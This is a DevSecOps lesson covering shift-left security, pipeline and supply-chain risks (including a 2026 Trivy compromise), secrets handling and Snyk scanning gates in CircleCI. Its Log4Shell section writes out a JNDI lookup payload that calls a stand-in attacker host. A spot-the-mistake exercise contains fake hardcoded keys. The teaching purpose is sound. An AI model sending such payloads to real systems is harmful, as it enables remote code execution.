# Lesson 4.13: DevSecOps Foundations

## Learning Objectives

By the end of this lesson, you will be able to:

1. **Explain** what DevSecOps is and how it differs from traditional DevOps
2. **Describe** the shift-left security approach and its benefits
3. **Identify** common security risks in CI/CD pipelines and dependency vulnerabilities
4. **Apply** secrets management best practices to protect sensitive credentials
5. **Explain** why pipelines should pin tools by immutable hashes, using the 2026 Trivy supply-chain attack
6. **Scan** dependencies (SCA) and code (SAST) with Snyk - on the Snyk website and as CircleCI security gates

---

## Prerequisites

Before starting this lesson, ensure you have:

- Completed Lesson 4.7 (CI with CircleCI)
- Completed Lesson 4.12 (Continuous Deployment to Railway)
- Understanding of CI/CD pipelines
- Basic understanding of Docker
- Your **devops-demo** repository with the Lesson 4.12 pipeline: build → test → publish → deploy
- A **GitHub** account (to sign up to Snyk)

---

## Introduction

In previous lessons, you learned to build automated CI/CD pipelines that build, test, publish, and deploy applications. But there's a critical piece missing: **security**.

Traditional approaches treated security as a final step before deployment - security teams would review code at the end. This caused delays, expensive fixes, and sometimes security vulnerabilities reaching production.

**DevSecOps** changes this by integrating security throughout the entire development lifecycle. In this lesson, you'll learn the principles and practices that make applications secure from the start - then scan your own project with **Snyk** and make the scan a gate in your CircleCI pipeline.

---

## Part 1 - What is DevSecOps?

### Definition

**DevSecOps** = Development + Security + Operations

DevSecOps is a philosophy and practice that integrates security into every phase of the software development lifecycle, from initial design through deployment and maintenance.

**Key idea:** Security is everyone's responsibility, not just the security team's job.

---

### Traditional Approach vs DevSecOps

**Traditional Security Approach:**

```
Developer → Write Code → Security Team Review → Fix Issues → Deploy
  (weeks)      (weeks)         (days/weeks)        (days)      (finally!)
```

**Problems:**
- Security checks happen too late
- Expensive to fix issues late in cycle
- Delays deployment
- Creates conflict between dev and security teams
- Vulnerabilities may slip through

---

**DevSecOps Approach:**

```
Developer → Write Code (with security tools running) → Auto Security Checks → Deploy
            └─ IDE security plugins                  └─ Pipeline scans
            └─ Secure coding practices              └─ Automated tests
```

**Benefits:**
- Security issues caught immediately
- Cheaper to fix early
- Faster deployment
- Security integrated, not bolted on
- Collaboration between teams

---

### Why DevSecOps Matters

**Real-world statistics:**

- **60%** of data breaches involve vulnerabilities for which a patch was available but not applied
- It costs **100x more** to fix a security bug in production vs during development
- **84%** of security breaches exploit known vulnerabilities in applications

**Sources:** Various industry reports (Verizon DBIR, Ponemon Institute)

---

### Real-World Example: The Trivy Supply-Chain Attack (2026)

**Trivy** is one of the most popular open-source security scanners. Thousands of teams run it in their CI/CD pipelines to keep vulnerable code **out** of production.

**What happened (19 March 2026):**
- Attackers published a **malicious Trivy release** (v0.69.4) that looked like a normal update - poisoned Docker image tags followed a few days later
- They **force-pushed** almost all version tags of the official `trivy-action` for GitHub Actions (75+ of 77) to point at malicious code
- Pipelines that ran Trivy during the attack ran **malware that stole secrets**: cloud, Docker registry, Git, SSH, Kubernetes and npm tokens
- The vulnerability was tracked as **CVE-2026-33634**

**Impact:**
- Every affected team had to treat **all** secrets in their pipelines as stolen - and rotate them
- A tool meant to **protect** the pipeline became the way **into** it

**Who was safe?**
- Teams that had pinned the action to a **full commit SHA** instead of a version tag - the attackers could move the tags, but not the commits
- Jobs that held **no secrets** had nothing to steal

**This is why DevSecOps matters!** Security isn't only about your application's code - your **pipeline** and the **tools** it runs are part of your attack surface. You'll look at how to protect against this in Part 7.

---

### DevSecOps Principles

**1. Security as Code**
- Security policies written as code
- Automated security checks in pipeline
- Version controlled like application code

**2. Continuous Security**
- Security checks run on every commit
- Not just once at the end
- Feedback loops for immediate action

**3. Collaboration**
- Developers, security, and ops work together
- Shared responsibility
- Security champions in dev teams

**4. Automation**
- Manual security reviews don't scale
- Automated scanning catches common issues
- Humans focus on complex threats

**5. Measurement**
- Track security metrics
- Monitor vulnerabilities over time
- Measure improvement

---

### DevSecOps Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    DevSecOps Lifecycle                       │
└─────────────────────────────────────────────────────────────┘

    Plan          Code          Build         Test         Deploy
     │             │              │            │             │
     ▼             ▼              ▼            ▼             ▼
┌─────────┐  ┌─────────┐   ┌─────────┐  ┌─────────┐  ┌─────────┐
│ Threat  │  │  Secure │   │Dependency│  │Security │  │Runtime  │
│Modeling │  │  Coding │   │ Scanning │  │ Testing │  │Monitoring│
└─────────┘  └─────────┘   └─────────┘  └─────────┘  └─────────┘
     │             │              │            │             │
     └─────────────┴──────────────┴────────────┴─────────────┘
                         Security Feedback Loop
```

---

### 🏃 Activity 1 — DevSecOps Real-World Discussion (10 min)

Read the Trivy supply-chain attack example above and discuss the following:

1. Trivy is a **security tool**. Why would attackers target a security tool instead of attacking an application directly?
2. Pipelines that used the action by **version tag** were hit; pipelines pinned to a **full commit SHA** were not. Why do you think that made the difference?
3. The malware stole the secrets available to the pipeline. Which secrets does **your** devops-demo pipeline hold (Lessons 4.7 and 4.12)? What could an attacker do with them?
4. Affected teams had to rotate **every** secret their pipelines could reach. How could a team limit the damage **before** an attack like this happens?

<!-- Discussion hints: 1) One compromised tool reaches thousands of pipelines - and CI pipelines hold powerful secrets. 2) Tags can be moved to different code; a commit SHA always points at the same code (covered in Part 7). 3) DOCKER_TOKEN (push any image to their Docker Hub repo) and RAILWAY_TOKEN (redeploy their production service). 4) Pin tools by hash, give secrets only to the jobs that need them, use short-lived/scoped tokens, know where every secret is so rotation is fast. -->

> **Key takeaway:** Security failures are almost always process failures, not just technical ones.

---

## Part 2 - Shift-Left Security

### What is Shift-Left?

**"Shift-left"** means moving security checks earlier in the development process.

**Traditional approach (Shift-Right):**

```
Development → Testing → Security Review → Production
                              ↑
                         Security happens here
                         (too late!)
```

**Shift-Left approach:**

```
Development → Testing → Security Review → Production
     ↑
Security happens here
(catch issues early!)
```

---

### Why Shift-Left?

**Cost of fixing bugs by phase:**

| Phase | Relative Cost | Time to Fix |
|-------|---------------|-------------|
| Development | 1x | Minutes |
| Testing | 10x | Hours |
| Pre-production | 100x | Days |
| Production | 1000x | Weeks |

**Example:**
- Fix during coding: 30 minutes
- Fix in production: 2 weeks + emergency deployment

---

### Benefits of Shift-Left Security

**1. Faster Feedback**
- Developers learn about issues immediately
- Fix while context is fresh in mind
- No waiting days/weeks for security review

**2. Lower Costs**
- Cheaper to fix early
- Less rework
- Fewer emergency patches

**3. Better Security**
- More issues caught
- Security becomes habit
- Preventive rather than reactive

**4. Happier Teams**
- No last-minute surprises
- Developers feel empowered
- Security team focuses on complex issues

---

### Shift-Left in Practice

**What developers do:**

**Before writing code:**
- Review security requirements
- Understand common vulnerabilities
- Use secure coding guidelines

**While writing code:**
- IDE plugins highlight security issues
- Code reviews include security checks
- Pair programming with security awareness

**Before committing:**
- Run security linters locally
- Check for hardcoded secrets
- Review dependencies

**In CI/CD pipeline:**
- Automated dependency scanning
- Static code analysis
- Security unit tests
- Container image scanning

---

### Example: Shift-Left in Action

**Scenario:** Developer adds a new dependency to pom.xml

**Without Shift-Left:**
```
Day 1: Developer adds dependency
Day 30: Code reaches security review
Day 31: Security finds vulnerability in dependency
Day 32-35: Developer (forgot context) must fix
Day 36: Retest everything
Day 37: Finally deploy
```

**With Shift-Left:**
```
Day 1, 2:00 PM: Developer adds dependency
Day 1, 2:05 PM: Pipeline runs, finds vulnerability
Day 1, 2:15 PM: Developer sees alert
Day 1, 2:30 PM: Developer updates to safe version
Day 1, 2:35 PM: Pipeline passes, deploys
```

**Result:** 36 days → 35 minutes!

---

### Shift-Left Security Diagram

```
┌────────────────────────────────────────────────────────────┐
│          Traditional: Security at the End (Slow)           │
└────────────────────────────────────────────────────────────┘

  Plan → Code → Build → Test → Security Check → Production
                              └─────────┬─────────┘
                                 Issues found late
                                 Expensive to fix


┌────────────────────────────────────────────────────────────┐
│         Shift-Left: Security Throughout (Fast)             │
└────────────────────────────────────────────────────────────┘

  Plan → Code → Build → Test → Security Check → Production
   ↓      ↓      ↓       ↓           ↓             ↓
  Sec    Sec    Sec     Sec         Sec           Sec
         Issues caught early - cheap to fix
```

---

## Part 3 - Pipeline Security Risks

### Common Security Risks in CI/CD Pipelines

Your CI/CD pipeline is a critical part of your infrastructure. If compromised, attackers can inject malicious code into your application.

---

### Risk 1: Hardcoded Secrets in Code

**What are secrets?**
- API keys
- Database passwords
- Private keys
- OAuth tokens
- Encryption keys

**The problem:**

```java
// BAD - Hardcoded secret
public class DatabaseConfig {
    private static final String DB_PASSWORD = "MySecretPassword123";
}
```

**Why this is dangerous:**
- Pushed to GitHub (now public!)
- Visible in commit history forever
- Anyone with repo access sees secrets
- Attackers scan GitHub for exposed secrets

**Real example:**
- Developer accidentally commits credentials to GitHub
- Within 2 minutes, bots find it
- Attacker uses credentials to access systems
- Company faces major security breach

---

### Risk 2: Vulnerable Dependencies

**The problem:**

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.3.30</version>  <!-- OLD VERSION WITH KNOWN VULNERABILITY! -->
</dependency>
```

**Why this is dangerous:**
- Old versions have known security flaws (CVEs)
- Attackers actively exploit these
- Easy target — vulnerability details are public

**Example:**
- Log4Shell vulnerability (December 2021)
- Affected millions of Java applications
- Allowed remote code execution
- Companies had to patch urgently

---

### Risk 3: Insecure Container Images

**The problem:**

```dockerfile
# BAD - Using old/vulnerable base image
FROM node:10
```

**Why this is dangerous:**
- Base images may have vulnerabilities
- Old versions don't get security patches
- Inherit all vulnerabilities from base image

**Better:**

```dockerfile
# GOOD - Using recent, maintained version
FROM node:20-alpine
```

---

### Risk 4: Insufficient Access Controls

**The problem:**
- Too many people have admin access to CI/CD
- Developers can modify pipeline configuration
- No code review for pipeline changes

**Why this is dangerous:**
- Attacker compromises one developer account
- Modifies pipeline to inject malware
- Malware deployed to production

---

### Risk 5: No Security Scanning in Pipeline

**The problem:**
- Pipeline only checks if code compiles
- Doesn't check for security issues
- Vulnerable code reaches production

---

### Attack Scenarios

**Scenario 1: Supply Chain Attack**
```
1. Attacker compromises a popular npm package
2. Your pipeline downloads the malicious version
3. Malicious code included in your application
4. Deployed to production
5. Attacker has backdoor access
```

**Scenario 2: Leaked Credentials**
```
1. Developer commits credentials to GitHub
2. Automated bot finds it in 2 minutes
3. Attacker uses credentials to access your databases
4. Steals customer data
5. Demands ransom
```

**Scenario 3: Vulnerable Dependency**
```
1. Your app uses old library with CVE
2. Attacker scans internet for vulnerable apps
3. Finds your app, exploits vulnerability
4. Gains access to server
5. Installs ransomware
```

---

### Pipeline Security Diagram

```
┌────────────────────────────────────────────────────────────┐
│              Secure CI/CD Pipeline                          │
└────────────────────────────────────────────────────────────┘

  Code Push
      ↓
  ┌─────────────────┐
  │ Source Control  │ ← Access Control (who can commit?)
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │   Build Stage   │ ← No hardcoded secrets
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │  Security Scan  │ ← Dependency check (SCA), SAST
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │   Test Stage    │ ← Security tests included
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │ Container Scan  │ ← Image vulnerability scan
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │    Deploy       │ ← Secure secrets injection
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │   DAST Scan     │ ← Attack the running app (test environment)
  └─────────────────┘
```

**Reference:**
https://www.aquasec.com/cloud-native-academy/supply-chain-security/ci-cd-pipeline-security/

---

## Part 4 - Secrets Management

### What are Secrets?

**Secrets** are sensitive pieces of information that your application needs to function:

- Database passwords
- API keys (Stripe, SendGrid, AWS)
- Private SSH keys
- OAuth client secrets
- Encryption keys
- Service account credentials
- Railway API tokens

---

### The Problem: Hardcoded Secrets

**Bad example:**

```java
public class EmailService {
    private static final String API_KEY = "YOUR_API_KEY_HERE";
    
    public void sendEmail(String to, String subject, String body) {
        // Use hardcoded API key
    }
}
```

**Why this is terrible:**

1. **Exposed in Git** — Committed to repository, visible in commit history forever. Even if deleted later, still in history
2. **Visible to everyone** — Anyone with repo access sees secrets. If repo is public, entire world sees it
3. **Can't rotate easily** — If key is compromised, must change everywhere, rebuild, redeploy
4. **Same secrets everywhere** — Development, staging, production use same key. Breach in one affects all

---

### Real-World Horror Stories

**Story 1: Uber (2016)**
- Uber developers committed credentials to GitHub
- Attackers found credentials, accessed cloud storage
- **Result:** 57 million user records stolen
- **Cost:** $148 million settlement

**Story 2: Toyota (2023)**
- Access key hardcoded in public GitHub repo for 5 years
- Anyone could access Toyota's cloud system
- **Result:** 2.15 million customer records exposed

**Story 3: Startup Horror**
- Startup commits payment API credentials to GitHub
- Bot finds it in minutes
- Attacker charges thousands to multiple accounts
- **Result:** Company almost bankrupt

---

### The Solution: Environment Variables

**Environment variables** store secrets outside your code.

**Good example:**

```java
public class EmailService {
    private final String apiKey;
    
    public EmailService() {
        this.apiKey = System.getenv("SENDGRID_API_KEY");
    }
    
    public void sendEmail(String to, String subject, String body) {
        // Use apiKey from environment
    }
}
```

**Benefits:**

1. **Not in code** — Never committed to Git, not visible in repo
2. **Different per environment** — Dev uses dev keys, production uses production keys
3. **Easy rotation** — Change environment variable, restart application, no code changes
4. **Access controlled** — Only ops/devops can set production secrets

---

### How Environment Variables Work

**In CI/CD (CircleCI):**

1. **Set in CircleCI dashboard:**
   - Project Settings → Environment Variables
   - Add: `SENDGRID_API_KEY = <your-actual-key>`
   - CircleCI encrypts and stores it

2. **Application reads it:**
   ```java
   String apiKey = System.getenv("SENDGRID_API_KEY");
   ```

---

### Best Practices for Secrets

**1. Never commit secrets to Git**
```bash
echo "DATABASE_PASSWORD=localdev123" > .env
echo ".env" >> .gitignore
```

**2. Use different secrets per environment**
```
Development:  DATABASE_PASSWORD=dev_password_123
Staging:      DATABASE_PASSWORD=staging_secure_456
Production:   DATABASE_PASSWORD=prod_ultra_secure_789
```

**3. Rotate secrets regularly**
- Change passwords every 90 days
- Rotate after employee leaves
- Rotate after suspected breach

**4. Use secret management tools**
- AWS Secrets Manager
- HashiCorp Vault
- Azure Key Vault
- GitHub Secrets (for GitHub Actions)

**5. Scan for exposed secrets**
- Use tools like `git-secrets` or `truffleHog`
- Scan commits before pushing
- Automated scanning in CI/CD

---

### What NOT to do

❌ **Hardcode in source code**
```java
String password = "MyPassword123";
```

❌ **Commit .env files**
```bash
git add .env  # DON'T DO THIS!
```

❌ **Put in config files in Git**
```properties
# application.properties - DON'T COMMIT THIS!
database.password=secretpassword
```

❌ **Share via Slack/Email**
```
Hey John, the production DB password is: <password>
```

❌ **Put in comments**
```java
// Production API key: <your-key-here>
```

---

### Environment Variables in Spring Boot

```properties
# application.properties
spring.datasource.url=${DATABASE_URL}
spring.datasource.username=${DATABASE_USERNAME}
spring.datasource.password=${DATABASE_PASSWORD}
```

**Set variables in CircleCI:**
- `DATABASE_URL=jdbc:postgresql://...`
- `DATABASE_USERNAME=myuser`
- `DATABASE_PASSWORD=securepassword123`

**Spring Boot automatically reads them!**

---

### 🏃 Activity 2 — Spot the Security Mistake (10 min)

Review the following code and configuration snippets. For each one, identify the security mistake and explain what the correct approach should be.

**Snippet 1:**
```java
@RestController
public class PaymentController {
    private static final String STRIPE_KEY = "sk_live_abc123xyz789";
    
    @PostMapping("/charge")
    public String charge() {
        // process payment using STRIPE_KEY
    }
}
```

**Snippet 2:**
```properties
# application.properties committed to GitHub
spring.datasource.url=jdbc:postgresql://prod-db.company.com:5432/customers
spring.datasource.username=admin
spring.datasource.password=SuperSecure2024!
```

**Snippet 3:**
```yml
# .circleci/config.yml
- run:
    name: Deploy
    command: |
      railway login --token railway_abc123def456
```

> **Discuss:** For each snippet — what could go wrong if this reached a public GitHub repo?

---

## Part 5 - Dependency Vulnerabilities

### What are Dependencies?

**Dependencies** are external libraries/packages your application uses.

**Example - Your Spring Boot pom.xml:**
```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.postgresql</groupId>
        <artifactId>postgresql</artifactId>
    </dependency>
</dependencies>
```

**Modern applications use LOTS of dependencies:**
- Typical Java application: 50-200 dependencies
- Each dependency may have its own dependencies
- You might indirectly use 500+ libraries

---

### What are CVEs?

**CVE = Common Vulnerabilities and Exposures**

A CVE is a publicly disclosed security vulnerability with:
- Unique ID (e.g., CVE-2021-44228)
- Description of the vulnerability
- Affected versions
- Severity score (0-10)

**CVE Severity Scores:**

| Score | Severity | Description |
|-------|----------|-------------|
| 9.0-10.0 | Critical | Immediate action required |
| 7.0-8.9 | High | Fix as soon as possible |
| 4.0-6.9 | Medium | Should fix |
| 0.1-3.9 | Low | Minor risk |

---

### Real-World Example: Log4Shell (CVE-2021-44228)

**What happened:**
- December 2021
- Vulnerability found in Log4j (Java logging library)
- **Score:** 10.0 (CRITICAL)
- Allowed remote code execution
- Affected millions of applications worldwide

**The vulnerability:**
```java
// Attacker sends this string:
String malicious = "${jndi:ldap://attacker.com/evil}";

// Log4j processes it and executes attacker's code!
logger.info("User input: " + malicious);
```

**Impact:**
- Minecraft servers compromised
- iCloud vulnerable
- Tesla affected
- Government systems at risk

**Fix:**
- Update Log4j from 2.14.1 → 2.17.0
- Emergency patches worldwide
- Cost: Billions in remediation

**Lesson:** One vulnerable dependency can affect millions!

---

### Dependency Vulnerability Lifecycle

```
┌─────────────────────────────────────────────────────────┐
│            Dependency Vulnerability Lifecycle           │
└─────────────────────────────────────────────────────────┘

1. Vulnerability Discovered
   ↓
2. CVE Published (made public)
   ↓
3. Attackers Start Exploiting
   ↓
4. Maintainers Release Patch
   ↓
5. Organizations Must Update ← YOU ARE HERE
   ↓
6. Vulnerability Mitigated
```

**Critical window:** Between CVE publication and your update!

---

### Example Vulnerable Dependencies

**Example 1: Old Spring Boot**

```xml
<!-- Vulnerable -->
<version>2.5.0</version>  <!-- OLD! Has CVE-2021-22118 -->

<!-- Fixed -->
<version>2.5.12</version>  <!-- Patched version -->
```

**Example 2: Old PostgreSQL Driver**

```xml
<!-- Vulnerable -->
<version>42.2.5</version>  <!-- Has SQL injection vulnerability -->

<!-- Fixed -->
<version>42.5.0</version>  <!-- Secure version -->
```

---

### Why Dependency Scanning in CI/CD?

**Without scanning:**
```
Developer adds dependency
    ↓
Code works, tests pass
    ↓
Deploy to production
    ↓
3 months later: CVE published
    ↓
Discover you're vulnerable → Emergency patch
```

**With scanning in CI/CD:**
```
Developer adds dependency
    ↓
Pipeline runs dependency scan
    ↓
Scan finds vulnerability
    ↓
Pipeline FAILS ← Caught immediately!
    ↓
Developer updates to safe version
    ↓
Pipeline passes, deploys safely
```

---

### Transitive Dependencies

**Problem:** You don't control all dependencies!

```
Your pom.xml:
└── spring-boot-starter-web (you added this)
    └── spring-web (indirect)
        └── spring-beans (indirect)
            └── VULNERABLE LIBRARY (you didn't know!)
```

**You're vulnerable even though you didn't directly add it!**

**Dependency scanning catches these!**

---

### Best Practices

**1. Keep dependencies up to date**
```bash
mvn versions:display-dependency-updates
```

**2. Use dependency scanning in CI/CD** — run on every build

**3. Don't ignore warnings** — "It's just a Medium severity, I'll fix it later" is how breaches happen

**4. Review dependency updates** — read changelogs, test thoroughly, update incrementally

**5. Remove unused dependencies** — fewer dependencies = smaller attack surface

---

## Part 6 - Security Scanning Tools Overview

### Types of Security Scanning

| Type | What it checks | When | Tools |
|---|---|---|---|
| **SAST** (Static Application Security Testing) | **Your own source code**, without running it: SQL injection, unsafe code patterns | Before or during build | Semgrep, CodeQL (built into GitHub), SonarQube / SonarCloud, SpotBugs + FindSecBugs (Java), Snyk Code, Checkmarx |
| **DAST** (Dynamic Application Security Testing) | The **running app**, by attacking it from outside: missing security headers, injection, misconfiguration | After deploy, against a test environment | OWASP ZAP, Burp Suite, Nuclei, Nikto |
| **SCA** (Software Composition Analysis) | **Other people's code** you depend on: known CVEs in libraries | Before build | Snyk, OSV-Scanner, Trivy `fs`, OWASP Dependency-Check, Dependabot |
| **Container scanning** | The image: OS packages and the libraries inside it | After build, before push | Trivy `image`, Snyk Container, Grype, Docker Scout |

**Also: secret scanning** - finds passwords and tokens committed by mistake (e.g. GitHub secret scanning, TruffleHog, git-secrets).

**Common mix-up:** dependency scanning is **SCA**, not SAST. SAST reads the code **you** wrote; SCA checks the libraries **others** wrote.

---

### The Tools We'll Use

| Lesson | Tool | Type | Where it runs |
|---|---|---|---|
| **4.13 (today)** | **Snyk** | SCA | On the Snyk website, then as a CircleCI job |
| 4.14 | **OSV-Scanner** (Google) | SCA | GitHub Actions |
| 4.14 | **OWASP ZAP** | DAST | GitHub Actions, against your Railway app |

---

### Security Scanning in DevSecOps Pipeline

```
┌────────────────────────────────────────────────────────────┐
│         Complete DevSecOps Pipeline with Scanning          │
└────────────────────────────────────────────────────────────┘

Code Push
    ↓
┌─────────────────┐
│  Build          │
└────────┬────────┘
         ↓
┌─────────────────┐
│  Unit Tests     │
└────────┬────────┘
         ↓
┌─────────────────┐
│  SAST Scan      │ ← Check your source code (e.g. Semgrep)
└────────┬────────┘
         ↓
┌─────────────────┐
│ Dependency Scan │ ← Check libraries - SCA (Snyk)
└────────┬────────┘
         ↓
┌─────────────────┐
│ Build Container │
└────────┬────────┘
         ↓
┌─────────────────┐
│ Container Scan  │ ← Check Docker image (e.g. Trivy)
└────────┬────────┘
         ↓
┌─────────────────┐
│  Deploy         │
└─────────────────┘

If ANY scan fails → Pipeline stops!
```

---

## Part 7 - Supply-Chain Security: Lessons from the Trivy Attack

In Part 1 you read how attackers turned **Trivy** - a security scanner - into a way to steal pipeline secrets. Now let's look at **why** some pipelines were hit and others weren't, and what you can do about it.

### Recap: Who Was Hit, Who Was Safe

| Pipeline used... | Example | Result |
|---|---|---|
| A **version tag** | `uses: aquasecurity/trivy-action@0.28.0` | ❌ Hit - the tag name stayed the same, but the code behind it changed |
| A **full commit SHA** | `uses: aquasecurity/trivy-action@<40-character SHA>` | ✅ Safe - the SHA still pointed at the old, trusted code |

---

### Tags Can Move. Hashes Can't.

| Reference | Example | Can it change? |
|---|---|---|
| Version tag | `v0.75.0`, `:latest`, `@v4` | **Yes** - whoever controls the repository can move it to different code |
| Full commit SHA | `@3d3c42e5aac5ba805825da76410c181273ba90b1` | **No** - a different commit has a different SHA |
| Image digest | `image@sha256:9f2c...` | **No** - a different image has a different digest |
| File checksum | `sha256sum -c` against a known hash | **No** - one changed byte gives a different hash |

**A tag is a label you trust. A hash is proof of exactly what you're running.**

**In GitHub Actions:**

```yaml
# Mutable - the tag can be moved to different code
- uses: actions/checkout@v7

# Immutable - pinned to one exact commit (comment keeps it readable)
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

**For a downloaded tool**, compare the file with a known SHA-256 hash before running it:

```bash
echo "<expected-sha256>  snyk" | sha256sum -c -
```

---

### Lessons for Every Pipeline

1. **Pin by hash, not by tag** - commit SHAs for actions, digests for images, checksums for downloads
2. **Update pins deliberately** - a new hash is a reviewed change, not something that happens silently
3. **Don't rush to brand-new releases** - waiting a few days lets the community spot a bad release
4. **Least privilege** - give secrets only to the jobs that need them. A scan job that holds no secrets has nothing to steal
5. **Assume breach and rotate** - after an incident, affected teams had to rotate **every** secret their pipelines could reach
6. **Your tools are part of your supply chain** - scanners, CLIs, actions and orbs deserve the same care as your dependencies

**Shift-left connection:** the attack came through the **pipeline**, not the application code. DevSecOps protects the pipeline as well as the app.

<!-- Discussion prompts (optional, 5 min): Which references in your own .circleci/config.yml are tags? (cimg images, the Railway CLI in deploy). Which jobs hold secrets? (publish: Docker Hub token via context; deploy: RAILWAY_TOKEN). Pinning images by digest stops automatic security updates - teams use tools like Renovate or Dependabot to update pinned digests. Source: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know -->

---

## Part 8 - Activity 3: Scan Your Project with Snyk (45 min)

**Your role today: the DevSecOps team.** Your job is to **find** security problems, **stop** them from reaching production, and **report** them to the developers. Fixing application code is the developers' job - not today's activity.

You'll use **Snyk** for two kinds of scanning:

| Scan | Type (Part 6) | What it reads |
|---|---|---|
| **Snyk Open Source** | **SCA** | `pom.xml` - the libraries you depend on |
| **Snyk Code** | **SAST** | Your own Java source code in `src/` |

...in two places:

| Part | Where | What you get |
|---|---|---|
| **A** | Snyk website | Snyk scans your GitHub repository and shows every issue with fix advice |
| **B** | CircleCI | `snyk_scan` (SCA) and `snyk_code` (SAST) jobs that **block publish and deploy** when HIGH or CRITICAL issues are found |
| **C** | GitHub | A **security ticket** for the developers |

**Your pipeline after Part B:**

```
build ──► test ──────┐
snyk_scan  (SCA) ────┼──► publish ──► deploy
snyk_code  (SAST) ───┘
```

**Expect the pipeline to fail.** devops-demo's dependencies already contain HIGH and CRITICAL vulnerabilities. That's the point: the security gate **stops** the release. You'll read what it found and report it.

<!-- INSTRUCTOR: run Part B on devops-demo before class and note which HIGH/CRITICAL issues snyk_scan reports (and whether snyk_code finds anything) so you can talk through them. Orb snyk/snyk@2.3.0 (latest version published in the CircleCI orb registry, 1 Apr 2025, checked 2026-10-21 - GitHub has newer tags 2.3.1-2.3.3 that are not published to the registry; use only registry versions) with cli-version 1.1308.1 (https://downloads.snyk.io/cli/stable/release.json, 2026-10-20). Students must enable Allow Uncertified Orbs in their own CircleCI organization, and Snyk Code in their Snyk organization. Check the current Snyk Free plan limits for Open Source and Code tests. -->

---

### Part A - Snyk Website

#### Step 1: Create a Free Snyk Account

1. Go to [https://snyk.io](https://snyk.io) and click **Sign up**
2. Choose **GitHub** and authorise Snyk
3. You're on the **Free** plan - no credit card needed

#### Step 2: Import Your devops-demo Repository

1. In [https://app.snyk.io](https://app.snyk.io), click **Add project** (or **Add** → **GitHub**)
2. If asked, allow Snyk to access your GitHub repositories
3. Select your **devops-demo** repository
4. Click **Add selected repositories**

Snyk finds `pom.xml`, works out every dependency - including transitive ones - and checks them against its vulnerability database. This takes a minute or two.

#### Step 3: Read the Results

Open **Projects** → **devops-demo** → `pom.xml`.

| What you see | Meaning |
|---|---|
| **C / H / M / L** counts | Number of Critical, High, Medium and Low issues |
| Issue card | Vulnerability type (e.g. "Denial of Service"), the library and version |
| **Introduced through** | The path from **your** dependency to the vulnerable library |
| **Fixed in** / **Upgrade** | The version that fixes it |
| **Snyk ID / CVE** | Links to full details, CVSS score and references |

**Lots of issues?** That's normal. devops-demo has only two direct dependencies, but they pull in dozens of transitive libraries - and some of them have known vulnerabilities.

**Good to know:**
- Snyk **re-tests imported projects regularly** and can email you about new vulnerabilities - even when you don't push any code
- Snyk may offer to **open a pull request** that upgrades a vulnerable dependency for you

#### Step 4: Turn On Snyk Code (SAST)

Snyk Code is switched off by default.

1. In Snyk, open **Settings** (for your organization) → **Snyk Code**
2. Turn on **Enable Snyk Code** and save
3. Go back to **Projects** → devops-demo. After the next re-test (or **Retest now**), a **Code analysis** project appears next to `pom.xml`

Open it to see issues found in **your** Java code - for example unsafe input handling - each with the file, the line and an explanation.

**Limitation:** the website scan doesn't **stop** anything. A vulnerable version could still be built, published and deployed by CircleCI. For that, the scan must be **inside the pipeline**.

---

### Part B - Snyk in Your CircleCI Pipeline

#### Step 5: Add Your Snyk Token to CircleCI

1. In Snyk, click your name (bottom left) → **Account settings**
2. In **General**, find **Auth Token** and click to reveal the **KEY** - copy it
3. In CircleCI: your **devops-demo** project → **Project Settings** → **Environment Variables** → **Add Environment Variable**
4. **Name:** `SNYK_TOKEN` - **Value:** your token

**Treat this token like a password** - never put it in your code or `config.yml`. The Snyk orb reads it from `SNYK_TOKEN` automatically.

#### Step 6: Allow Partner Orbs in CircleCI

We'll install Snyk with an **orb** - a reusable package of CircleCI configuration. Snyk publishes an official orb, `snyk/snyk`.

CircleCI only **certifies** orbs it writes itself. Orbs from partners like Snyk are "uncertified", and are blocked until you allow them:

1. In CircleCI, open **Organization Settings** (your personal organization)
2. Click **Security**
3. Set **Allow Uncertified Orbs** to **Yes**

**Is that safe?** You're deciding to trust **Snyk's** orb, published under Snyk's own namespace - and in the next step you pin it to an exact version that can never change. In a company, a security or platform team usually makes this decision for everyone.

#### Step 7: Add the Snyk Orb and the `snyk_scan` Job

At the top of `.circleci/config.yml`, under `version: 2.1`, add:

```yml
orbs:
  snyk: snyk/snyk@2.3.0
```

Then add this job after `test`:

```yml
  # ==========================================
  # SNYK_SCAN JOB - Snyk: scan Maven dependencies
  # ==========================================
  snyk_scan:
    docker:
      - image: cimg/openjdk:21.0
    steps:
      - checkout
      - restore_cache:
          keys:
            - maven-deps-{{ checksum "pom.xml" }}
            - maven-deps-
      - snyk/scan:
          severity-threshold: high
          cli-version: 1.1308.1
          monitor-on-build: false
```

**What this does:**

| Line | Purpose |
|---|---|
| `orbs: snyk: snyk/snyk@2.3.0` | Imports Snyk's orb at **exactly** version 2.3.0 |
| `cimg/openjdk:21.0` | Java and Maven - Snyk runs Maven to list every dependency |
| `restore_cache` | Reuses Maven downloads from the build job - faster |
| `snyk/scan` | The orb's command: installs the Snyk CLI, logs in with `SNYK_TOKEN`, and runs `snyk test` |
| `severity-threshold: high` | **Fails** the job on any HIGH or CRITICAL issue (the default, `low`, would fail on anything) |
| `cli-version: 1.1308.1` | Uses this exact Snyk CLI version - without it, the orb downloads the **latest** CLI |
| `monitor-on-build: false` | Don't upload a snapshot to the Snyk website - Part A already watches your repository |

#### Why Is the Orb Secure?

Remember Part 7: **tags can move, hashes can't**. An orb version is closer to a hash than to a tag:

| Protection | How it works |
|---|---|
| **Published versions are immutable** | Once `snyk/snyk@2.3.0` is published to the CircleCI orb registry, it can't be edited or deleted - a change needs a **new** version number. Nobody can quietly swap the code behind `2.3.0`, the way the Trivy attackers moved Git tags |
